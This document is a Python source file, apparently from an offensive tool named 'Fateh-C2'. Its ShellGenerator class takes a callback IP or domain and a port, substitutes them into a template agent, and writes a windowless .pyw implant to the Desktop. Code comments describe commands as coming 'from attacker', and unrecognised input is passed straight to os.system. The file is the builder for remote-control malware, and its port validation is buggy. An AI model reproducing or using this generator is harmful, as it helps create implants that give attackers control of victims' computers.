import os
from socket import gethostbyname, inet_aton
from termcolor import colored
from getpass import getuser
from .tool_data import CommandModes, generator_help
from .autocompleter import CommandCompleter


class ShellGenerator:

    def __init__(self) -> None:
        os.chdir(os.path.dirname(__file__))
        self.name = "Fateh-C2.pyw"
        self.host = "127.0.0.1"
        self.port = 8080
        self.shell_source = os.path.join("agents", "py_c2.txt")
        self.command_flag = "Shell-Generator"
        self.commands_list = CommandModes.generator_commands
        self.is_generated = False
        self.extract_path = r"/home/{}/Desktop".format(getuser())


    def show_options(self):
        print(f"""
        [+] Shell info      Value
        ==============      =====
        Shell-Name          {colored(self.name, "green")}
        Shell-Host          {colored(self.host, "green")}
        Shell-Port          {colored(self.port, "green")}
        Shell-stat          is_generated? {colored(self.is_generated, "green")} 
    """)


    ## Validation functions
    def name_validation(self, name: str):
        if len(name) > 1:
            return f"{name}.pyw"
        else:
            print(colored(f"[-] Error with naming shell [{name}.pyw]", "red"))
            exit()


    def host_validation(self, host: str) -> str:
        """Check if the passed host is valid ip address or domain name.
           Then return host if it's valid."""

        ALPHA = "abcdefghijklmnopqrstuvwxyz"
        if host[0] in ALPHA or host[0] in ALPHA.upper():
            try:
                host = gethostbyname(host)
                return host
            except Exception as error_message:
                print(colored(f"[-] Error message:\n{error_message}\n", "red"))
                exit()
        else:
            try:
                if inet_aton(host):
                    return host
            except Exception as error_message:
                print(colored(f"[-] Error message:\n{error_message}\n", "red"))
                exit()


    def port_validation(self, port: str) -> int:
        if len(port) < 1:
            return self.port
        try:
            if int(port) < 1 or int(port) > 65353:
                print(colored("[-] Invalid port number, it must be between (1-65353)", "red"))
            return int(port)
        except Exception as error_message:
            print(colored(f"[-] Error message:\n{error_message}\n", "red"))
            exit()


        ###################################################################################
        ######                          Generate Shell methods                       ######
        ###################################################################################


    
    def reading_shell(self, host: str, port: int, name: str) -> str:
        with open(self.shell_source, "r") as file_obj:
            source = file_obj.read()
        source = source.replace("XIP", host)
        source = source.replace("XPORT", str(port))
        source = source.replace("XNAME", name)
        return source


    def write_shell(self, new_source) -> None:
        with open(self.name, "w") as shell_file:
            shell_file.write(new_source)


    def generate(self):
        try:
            # read shell source code with it's new data
            shell_source = self.reading_shell(self.host, self.port, self.name)

            # change cwd to the ectraction path
            os.chdir(self.extract_path)
            self.write_shell(shell_source)
            c2_path = os.path.join(self.extract_path, self.name)
            if os.path.isfile(c2_path):
                self.is_generated = True
            else:
                print(colored(f"[-] Your C2 isn't in the extraction path @ {c2_path}", "red"))
        except Exception as error_message:
            print(
                colored(
                    f"[-] An error was occurred while generating your C2\nErrorMessage\n\n{error_message}",
                    "red"
                ))
        finally:
            print(colored(f"[+] Your C2 {self.name} (Fateh-C2) is generated at {c2_path}", "green"))


    def command_prompot(self):
        completer = CommandCompleter(self.commands_list)

        while True:
            # reading comamnds from attacker
            command = completer.read_input(self.command_flag)

            # set shell name
            if "set_name" in command.lower():
                try:
                    name = command.lower().replace("set_name", "").strip()
                except:
                    self.name = "shell.pyw"
                finally:
                    self.name = self.name_validation(name)

            # set shell host
            elif "set_host" in command.lower():
                try:
                    host = command.lower().replace("set_host", "").strip()
                except:
                    pass
                finally:
                    self.host = self.host_validation(host)

            # set shell port
            elif "set_port" in command.lower():
                port = command.lower().replace("set_port", "").strip()
                if self.port_validation(port):
                    self.port = self.port_validation(port)

            elif "show" in command.lower():
                self.show_options()

            elif "generate" in command.lower():
                self.generate()

            elif "end" in command.lower():
                break

            elif "_help" in command.lower():
                generator_help(self.command_flag)
            
            else:
                os.system(command)


if __name__ == "__main__":
    x = ShellGenerator()
    x.command_prompot()
